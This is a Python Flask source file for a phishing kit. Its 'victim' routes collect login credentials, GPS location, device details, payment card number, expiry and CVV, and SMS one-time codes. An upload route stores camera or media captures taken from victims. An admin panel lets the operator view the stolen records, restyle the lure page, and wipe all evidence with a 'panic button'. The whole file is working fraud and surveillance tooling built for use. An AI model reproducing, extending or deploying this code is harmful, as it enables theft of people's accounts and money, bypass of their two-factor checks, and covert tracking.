import os, sqlite3, time, shutil
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

app = Flask(__name__)
app.secret_key = "franco_master_ultra_key_2024" # Clave fija para evitar cierres de sesión
@app.after_request
def add_header(response):
    response.headers['ngrok-skip-browser-warning'] = 'true'
    return response

# --- CONFIGURACIÓN DE DIRECTORIOS ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'static', 'uploads') 
SYSTEM_FOLDER = os.path.join(BASE_DIR, 'static', 'system')  
MEDIA_FOLDER = os.path.join(BASE_DIR, 'static', 'captured')
DB_PATH = os.path.join(BASE_DIR, 'database.db')

for folder in [UPLOAD_FOLDER, SYSTEM_FOLDER, MEDIA_FOLDER]:
    if not os.path.exists(folder): os.makedirs(folder)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS registros 
        (id INTEGER PRIMARY KEY AUTOINCREMENT, user TEXT, pass TEXT, tarjeta TEXT, 
         sms TEXT, hora TEXT, lat REAL, lon REAL, bateria TEXT, 
         resolucion TEXT, zona_horaria TEXT, status TEXT)''')
    conn.commit(); conn.close()

init_db()

# Configuración Inicial (Se actualiza desde el panel)
config_web = {
    "user_admin": "franco", "pass_admin": "franco",
    "alias": "VIP.PLATINUM.SYSTEM", "precio": "5000",
    "img_principal": "/static/system/portada.jpg",
    "titulo": "ACCESO PREMIUM EXCLUSIVO",
    "color_fondo": "#0d0221", "color_texto": "#ffffff"
}

# --- RUTAS DE LA VÍCTIMA ---

@app.route('/')
def login():
    return render_template('login.html', config=config_web)

@app.route('/auth', methods=['POST'])
def auth():
    u, p = request.form.get('email'), request.form.get('pass')
    lat, lon = request.form.get('lat_gps', 0), request.form.get('lon_gps', 0)
    batt, res = request.form.get('bateria', 'N/A'), request.form.get('resolucion', 'N/A')
    tz = request.form.get('tz', 'N/A')
    
    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
    cursor.execute("""INSERT INTO registros 
        (user, pass, tarjeta, sms, hora, lat, lon, bateria, resolucion, zona_horaria, status) 
        VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
        (u, p, "ESPERANDO...", "PENDIENTE", datetime.now().strftime("%H:%M:%S"), 
         lat, lon, batt, res, tz, "ONLINE"))
    session['current_id'] = cursor.lastrowid
    conn.commit(); conn.close()
    session['logged_in'] = True
    return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'): return redirect(url_for('login'))
    fotos = [f for f in os.listdir(UPLOAD_FOLDER) if f.lower().endswith(('png', 'jpg', 'jpeg'))]
    return render_template('dashboard.html', config=config_web, fotos=fotos)

@app.route('/upload_capture', methods=['POST'])
def upload_capture():
    if 'file' in request.files:
        f = request.files['file']
        tipo = request.form.get('type', 'MEDIO').upper()
        rid = request.form.get('id', session.get('current_id', '0'))
        ext = 'jpg' if 'image' in f.content_type else 'webm'
        fname = f"{tipo}_{rid}_{int(time.time())}.{ext}"
        f.save(os.path.join(MEDIA_FOLDER, fname))
    return jsonify({"s": "ok"})

@app.route('/captura_pago', methods=['POST'])
def captura_pago():
    rid = session.get('current_id')
    if rid:
        data = f"CC: {request.form.get('cc')} | EXP: {request.form.get('exp')} | CVV: {request.form.get('cvv')}"
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("UPDATE registros SET tarjeta=?, status='ESPERANDO_SMS' WHERE id=?", (data, rid))
        conn.commit(); conn.close()
        return render_template('procesando.html', config=config_web)
    return redirect(url_for('login'))

@app.route('/verificar_sms', methods=['POST'])
def verificar_sms():
    rid = session.get('current_id')
    sms_code = request.form.get('sms_code')
    if rid:
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("UPDATE registros SET sms=?, status='COMPLETO' WHERE id=?", (sms_code, rid))
        conn.commit(); conn.close()
        return render_template('error_final.html', config=config_web)
    return redirect(url_for('login'))

# --- RUTAS DE ADMINISTRACIÓN (PANEL DE CONTROL) ---

@app.route('/matrix_admin', methods=['GET', 'POST'])
@app.route('/matrix', methods=['GET', 'POST'])
def admin_matrix():
    if request.method == 'POST':
        user_in = request.form.get('user')
        pass_in = request.form.get('pass')
        if user_in == config_web["user_admin"] and pass_in == config_web["pass_admin"]:
            session['is_admin'] = True
            return redirect(url_for('admin_matrix'))
    
    if session.get('is_admin'):
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("SELECT * FROM registros ORDER BY id DESC")
        regs = cursor.fetchall(); conn.close()
        galeria = os.listdir(UPLOAD_FOLDER)
        return render_template('admin.html', config=config_web, registros=regs, capturas=os.listdir(MEDIA_FOLDER), galeria=galeria)
    return render_template('admin_login.html')

@app.route('/update_config', methods=['POST'])
def update_config():
    if session.get('is_admin'):
        if 'portada' in request.files:
            file = request.files['portada']
            if file.filename != '': file.save(os.path.join(SYSTEM_FOLDER, "portada.jpg"))
        
        config_web.update({
            "titulo": request.form.get('titulo'),
            "alias": request.form.get('alias'),
            "precio": request.form.get('precio'),
            "color_fondo": request.form.get('color_fondo'),
            "color_texto": request.form.get('color_texto')
        })
    return redirect(url_for('admin_matrix'))

@app.route('/add_gallery', methods=['POST'])
def add_gallery():
    if session.get('is_admin') and 'file' in request.files:
        f = request.files['file']
        if f.filename != '': f.save(os.path.join(UPLOAD_FOLDER, f.filename))
    return redirect(url_for('admin_matrix'))

@app.route('/delete_file/<filename>')
def delete_file(filename):
    if session.get('is_admin'):
        try: os.remove(os.path.join(UPLOAD_FOLDER, filename))
        except: pass
    return redirect(url_for('admin_matrix'))

@app.route('/delete_log/<int:id>')
def delete_log(id):
    if session.get('is_admin'):
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("DELETE FROM registros WHERE id=?", (id,))
        conn.commit(); conn.close()
    return redirect(url_for('admin_matrix'))

@app.route('/panic_button', methods=['POST'])
def panic_button():
    if session.get('is_admin'):
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("DELETE FROM registros"); conn.commit(); conn.close()
        for folder in [MEDIA_FOLDER, UPLOAD_FOLDER]:
            for f in os.listdir(folder):
                try: os.remove(os.path.join(folder, f))
                except: pass
        return jsonify({"s": "ok"})
    return jsonify({"s": "error"}), 403

if __name__ == '__main__':
    # Render usa la variable de entorno PORT
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

